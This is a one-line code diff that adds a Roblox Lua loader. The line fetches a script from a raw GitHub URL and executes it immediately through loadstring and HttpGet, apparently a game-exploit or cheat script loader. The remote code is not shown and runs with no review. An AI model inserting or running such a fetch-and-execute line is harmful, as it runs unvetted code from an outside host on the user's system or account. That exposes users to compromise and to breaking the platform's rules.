@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pkplaysrblx/moon-yield/refs/heads/main/script.lua"))()
